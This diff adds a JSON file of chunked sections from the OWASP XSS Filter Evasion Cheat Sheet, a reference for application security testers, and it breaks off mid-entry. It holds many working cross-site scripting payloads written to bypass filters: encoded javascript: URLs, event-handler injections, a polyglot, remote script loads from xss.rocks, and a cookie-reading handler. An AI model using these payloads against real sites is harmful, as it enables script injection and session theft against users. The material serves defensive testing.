@@ -1,0 +1,742 @@
+{
+ "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+ "title": "XSS Filter Evasion Cheat Sheet",
+ "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+ "chunks": [
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#001",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Introduction",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This article is a guide to Cross Site Scripting (XSS) testing for application security professionals. This cheat sheet was originally based on RSnake's seminal XSS Cheat Sheet previously at: http://ha.ckers.org/xss.html. Now, the OWASP Cheat Sheet Series provides users with an updated and maintained version of the document. The very first OWASP Cheat Sheet, Cross Site Scripting Prevention, was inspired by RSnake's work and we thank RSnake for the inspiration!"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#002",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This cheat sheet demonstrates that input filtering is an incomplete defense for XSS by supplying testers with a series of XSS attacks that can bypass certain XSS defensive filters."
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#003",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Basic XSS Test Without Filter Evasion",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "For this baseline test, host a script containing only alert('XSS') on an HTTPS endpoint you control. Replace the placeholder URL below with that script's URL:\n\n```\n<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>\n```\n\nUse a script you have reviewed and control: external scripts execute in the context of the tested page. A mutable third-party script can change what runs during your test."
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#004",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > XSS Locator (Polyglot)",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This test delivers a 'polyglot test XSS payload' that executes in multiple contexts, including HTML, script strings, JavaScript, and URLs:\n\n```\njavascript:/*--></title></style></textarea></script></xmp>\n<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>\n```\n\n(Based on this tweet by Gareth Heyes)."
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#005",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Malformed A Tags",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This test skips the href attribute to demonstrate an XSS attack using event handlers:\n\n```\n\\<a onmouseover=\"alert(document.cookie)\"\\>xxs link\\</a\\>\n```\n\nChrome automatically inserts missing quotes for you. If you encounter issues, try omitting them and Chrome will correctly place the missing quotes in URLs or scripts for you:\n\n```\n\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>\n```\n\n(Submitted by David Cross, Verified on Chrome)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#006",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Malformed IMG Tags",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This XSS method uses the relaxed rendering engine to create an XSS vector within an IMG tag (which needs to be encapsulated within quotes). We believe this approach was originally meant to correct sloppy coding and it would also make it significantly more difficult to correctly parse HTML tags:\n\n```\n<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\"\\>\n```\n\n(Originally found by Begeek, but it was cleaned up and shortened to work in all browsers)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#007",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > fromCharCode",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If the system does not allow quotes of any kind, you can eval() a fromCharCode in JavaScript to create any XSS vector you need:\n\n```\n<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">Click Me!</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#008",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Default SRC Tag to Get Past Filters that Check SRC Domain",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack will bypass most SRC domain filters. Inserting JavaScript in an event handler also applies to any HTML tag type injection using elements like Form, Iframe, Input, Embed, etc. This also allows the substitution of any relevant event for the tag type, such as onblur or onclick, providing extensive variations of the injections listed here:\n\n```\n<IMG SRC=# onmouseover=\"alert('xxs')\">\n```\n\n(Submitted by David Cross and edited by Abdullah Hussam)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#009",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Default SRC Tag by Leaving it Empty",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<IMG SRC= onmouseover=\"alert('xxs')\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#010",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Default SRC Tag by Leaving it out Entirely",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<IMG onmouseover=\"alert('xxs')\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#011",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > On Error Alert",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#012",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > IMG onerror and JavaScript Alert Encode",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#013",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Decimal HTML Character References",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Since XSS examples that use a javascript: directive inside an <IMG tag do not work on Firefox this approach uses decimal HTML character references as a workaround:\n\n```\n <a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">Click Me!</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#014",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Decimal HTML Character References Without Trailing Semicolons",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This is often effective in bypassing XSS filters that look for the string &\\#XX;, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like $tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/; which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):\n\n```\n<a href=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">Click Me</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#015",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Hexadecimal HTML Character References Without Trailing Semicolons",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack is also viable against the filter for the string $tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:\n\n```\n<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\">Click Me</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#016",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Embedded Tab",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This approach breaks up the XSS attack:\n\n```\n <a href=\"jav   ascript:alert('XSS');\">Click Me</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#017",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Embedded Encoded Tab",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This approach can also break up XSS:\n\n```\n <a href=\"jav&#x09;ascript:alert('XSS');\">Click Me</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#018",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Embedded Newline to Break Up XSS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "While some defenders claim that any of the chars 09-13 (decimal) will work for this attack, this is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. Examine the ASCII table for reference. The next four XSS attack examples illustrate this vector:\n\n```\n<a href=\"jav&#x0A;ascript:alert('XSS');\">Click Me</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#019",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Embedded Newline to Break Up XSS > Example 1: Break Up XSS Attack with Embedded Carriage Return",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I've seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):\n\n```\n<a href=\"jav&#x0D;ascript:alert('XSS');\">Click Me</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#020",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Embedded Newline to Break Up XSS > Example 2: Break Up JavaScript Directive with Null",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy or use %00 in the URL string or if you want to write your own injection tool you can either use vim (^V^@ will produce a null) or the following program to generate it into a text file. The null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example:\n\n```\nperl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#021",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Embedded Newline to Break Up XSS > Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This is useful if a filter's pattern match doesn't take into account spaces in the word javascript:, which is correct since that won't render, but makes the false assumption that you can't have a space between the quote and the javascript: keyword. The actual reality is you can have any char from 1-32 in decimal:\n\n```\n<a href=\" &#14;  javascript:alert('XSS');\">Click Me</a>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#022",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Embedded Newline to Break Up XSS > Example 4: Non-alpha-non-digit XSS",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "The Firefox HTML parser assumes a non-alpha-non-digit is not valid after an HTML keyword and therefore considers it to be a whitespace or non-valid token after an HTML tag. The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace. For example \\<SCRIPT\\\\s != \\<SCRIPT/XSS\\\\s:\n\n```\n<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n```\n\nBased on the same idea as above, however, expanded on it, using Rsnake's fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:\n\n```\n<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>\n```\n\nYair Amit noted that there is a slightly different behavior between the Trident (IE) and Gecko (Firefox) rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful in a attack if the system does not allow spaces:\n\n```\n<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#023",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Extraneous Open Brackets",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This XSS vector could defeat certain detection engines that work by checking matching pairs of open and close angle brackets then comparing the tag inside, instead of a more efficient algorithm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to suppress a JavaScript error:\n\n```\n<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>\n```\n\n(Submitted by Franz Sedlmaier)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#024",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > No Closing Script Tags",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "With Firefox, you don't actually need the \\></SCRIPT> portion of this XSS vector, because Firefox assumes it's safe to close the HTML tag and adds closing tags for you. Unlike the next attack, which doesn't affect Firefox, this method does not require any additional HTML below it. You can add quotes if you need to, but they're normally not needed:\n\n```\n<SCRIPT SRC=http://xss.rocks/xss.js?< B >\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#025",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Protocol Resolution in Script Tags",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This particular variant is partially based on Ozh's protocol resolution bypass below, and it works in IE and Edge in compatibility mode. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The .j is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag:\n\n```\n<SCRIPT SRC=//xss.rocks/.j>\n```\n\n(Submitted by Łukasz Pilorz)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#026",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Half Open HTML/JavaScript XSS Vector",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "Unlike Firefox, the IE rendering engine (Trident) doesn't add extra data to your page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is any HTML tag below where you are injecting this XSS vector. Even though there is no close \\> tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following network intrusion detection system (NIDS) regex: /((\\\\%3D)|(=))\\[^\\\\n\\]\\*((\\\\%3C)|\\<)\\[^\\\\n\\]+((\\\\%3E)|\\>)/ because it doesn't require the end \\>. As a side note, this was also affective against a real world XSS filter using an open ended <IFRAME tag instead of an <IMG tag.\n\n```\n<IMG SRC=\"`<javascript:alert>`('XSS')\"\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#027",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > Escaping JavaScript Escapes",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "If an application is written to output some user information inside of a JavaScript (like the following: <SCRIPT>var a=\"$ENV{QUERY\\_STRING}\";</SCRIPT>) and you want to inject your own JavaScript into it but the server side application escapes certain quotes, you can circumvent that by escaping their escape character. When this gets injected it will read <SCRIPT>var a=\"\\\\\\\\\";alert('XSS');//\";</SCRIPT> which ends up un-escaping the double quote and causing the XSS vector to fire. The XSS locator uses this method:\n\n```\n\\\";alert('XSS');//\n```\n\nAn alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:\n\n```\n</script><script>alert('XSS');</script>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#028",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > End Title Tag",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This is a simple XSS vector that closes <TITLE> tags, which can encapsulate the malicious cross site scripting attack:\n\n```\n</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#029",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > End Title Tag > INPUT Image",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#030",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > End Title Tag > BODY Image",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<BODY BACKGROUND=\"javascript:alert('XSS')\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#031",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > End Title Tag > IMG Dynsrc",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<IMG DYNSRC=\"javascript:alert('XSS')\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#032",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > End Title Tag > IMG Lowsrc",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<IMG LOWSRC=\"javascript:alert('XSS')\">\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#033",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > List-style-image",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This esoteric attack focuses on embedding images for bulleted lists. It will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful XSS vector:\n\n```\n<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</br>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#034",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > VBscript in an Image",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\n<IMG SRC='vbscript:msgbox(\"XSS\")'>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#035",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > ECMAScript 6",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "```\nSet.constructor`alert\\x28document.domain\\x29\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#036",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "This attack doesn't require using any variants of javascript: or <SCRIPT... to accomplish the XSS attack. Dan Crowley has noted that you can put a space before the equals sign (onload= != onload =):\n\n```\n<BODY ONLOAD=alert('XSS')>\n```"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#037",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag > Attacks Using Event Handlers",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "The attack with the BODY tag can be modified for use in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.\n\nThe Dottoro Web Reference also has a nice list of events in JavaScript.\n\nonAbort() (when user aborts the loading of an image)\n\nonActivate() (when object is set as the active element)\n\nonAfterPrint() (activates after user prints or previews print job)\n\nonAfterUpdate() (activates on data object after updating data in the source object)\n\nonBeforeActivate() (fires before the object is set as the active element)\n\nonBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand(\"Copy\") function)\n\nonBeforeCut() (attacker executes the attack string right before a selection is cut)\n\nonBeforeDeactivate() (fires right after the activeElement is changed from the current object)\n\nonBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)\n\nonBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand(\"Paste\") function)\n\nonBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand(\"Print\") function).\n\nonBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)\n\nonBeforeUpdate() (activates on data object before updating data in the source object)\n\nonBegin() (the onbegin event fires immediately when the element's timeline begins)\n\nonBlur() (in the case where another popup is loaded and window looses focus)\n\nonBounce() (fires when the behavior property of the marquee object is set to \"alternate\" and the contents of the marquee reach one side of the window)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#038",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag > Attacks Using Event Handlers",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "onCellChange() (fires when data changes in the data provider)\n\nonChange() (select, text, or TEXTAREA field loses focus and its value has been modified)\n\nonClick() (someone clicks on a form)\n\nonContextMenu() (user would need to right click on attack area)\n\nonControlSelect() (fires when the user is about to make a control selection of the object)\n\nonCopy() (user needs to copy something or it can be exploited using the execCommand(\"Copy\") command)\n\nonCut() (user needs to copy something or it can be exploited using the execCommand(\"Cut\") command)\n\nonDataAvailable() (user would need to change data in an element, or attacker could perform the same function)\n\nonDataSetChanged() (fires when the data set exposed by a data source object changes)\n\nonDataSetComplete() (fires to indicate that all data is available from the data source object)\n\nonDblClick() (user double-clicks a form element or a link)\n\nonDeactivate() (fires when the activeElement is changed from the current object to another object in the parent document)\n\nonDrag() (requires that the user drags an object)\n\nonDragEnd() (requires that the user drags an object)\n\nonDragLeave() (requires that the user drags an object off a valid location)\n\nonDragEnter() (requires that the user drags an object into a valid location)\n\nonDragOver() (requires that the user drags an object into a valid location)\n\nonDragDrop() (user drops an object (e.g. file) onto the browser window)\n\nonDragStart() (occurs when user starts drag operation)\n\nonDrop() (user drops an object (e.g. file) onto the browser window)\n\nonEnd() (the onEnd event fires when the timeline ends.\n\nonError() (loading of a document or image causes an error)\n\nonErrorUpdate() (fires on a data bound object when an error occurs while updating the associated data in the data source object)\n\nonFilterChange() (fires when a visual filter completes state change)\n\nonFinish() (attacker can create the exploit when marquee is finished looping)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#039",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag > Attacks Using Event Handlers",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "onFocus() (attacker executes the attack string when the window gets focus)\n\nonFocusIn() (attacker executes the attack string when window gets focus)\n\nonFocusOut() (attacker executes the attack string when window looses focus)\n\nonHashChange() (fires when the fragment identifier part of the document's current address changed)\n\nonHelp() (attacker executes the attack string when users hits F1 while the window is in focus)\n\nonInput() (the text content of an element is changed through the user interface)\n\nonKeyDown() (user depresses a key)\n\nonKeyPress() (user presses or holds down a key)\n\nonKeyUp() (user releases a key)\n\nonLayoutComplete() (user would have to print or print preview)\n\nonLoad() (attacker executes the attack string after the window loads)\n\nonLoseCapture() (can be exploited by the releaseCapture() method)\n\nonMediaComplete() (When a streaming media file is used, this event could fire before the file starts playing)\n\nonMediaError() (User opens a page in the browser that contains a media file, and the event fires when there is a problem)\n\nonMessage() (fire when the document received a message)\n\nonMouseDown() (the attacker would need to get the user to click on an image)\n\nonMouseEnter() (cursor moves over an object or area)\n\nonMouseLeave() (the attacker would need to get the user to mouse over an image or table and then off again)\n\nonMouseMove() (the attacker would need to get the user to mouse over an image or table)\n\nonMouseOut() (the attacker would need to get the user to mouse over an image or table and then off again)\n\nonMouseOver() (cursor moves over an object or area)\n\nonMouseUp() (the attacker would need to get the user to click on an image)\n\nonMouseWheel() (the attacker would need to get the user to use their mouse wheel)\n\nonMove() (user or attacker would move the page)\n\nonMoveEnd() (user or attacker would move the page)\n\nonMoveStart() (user or attacker would move the page)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#040",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag > Attacks Using Event Handlers",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+   "text": "onOffline() (occurs if the browser is working in online mode and it starts to work offline)\n\nonOnline() (occurs if the browser is working in offline mode and it starts to work online)\n\nonOutOfSync() (interrupt the element's ability to play its media as defined by the timeline)\n\nonPaste() (user would need to paste or attacker could use the execCommand(\"Paste\") function)\n\nonPause() (the onpause event fires on every element that is active when the timeline pauses, including the body element)\n\nonPopState() (fires when user navigated the session history)\n\nonPropertyChange() (user or attacker would need to change an element property)\n\nonReadyStateChange() (user or attacker would need to change an element property)\n\nonRedo() (user went forward in undo transaction history)\n\nonRepeat() (the event fires once for each repetition of the timeline, excluding the first full cycle)\n\nonReset() (user or attacker resets a form)\n\nonResize() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)\n\nonResizeEnd() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)\n\nonResizeStart() (user would resize the window; attacker could auto initialize with something like: <SCRIPT>self.resizeTo(500,400);</SCRIPT>)\n\nonResume() (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)\n\nonReverse() (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)\n\nonRowsEnter() (user or attacker would need to change a row in a data source)\n\nonRowExit() (user or attacker would need to change a row in a data source)\n\nonRowDelete() (user or attacker would need to delete a row in a data source)\n\nonRowInserted() (user or attacker would need to insert a row in a data source)"
+  },
+  {
+   "chunk_id": "XSS_Filter_Evasion_Cheat_Sheet#041",
+   "doc": "XSS_Filter_Evasion_Cheat_Sheet",
+   "section": "Tests > BODY Tag > Attacks Using Event Handlers",
+   "url": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
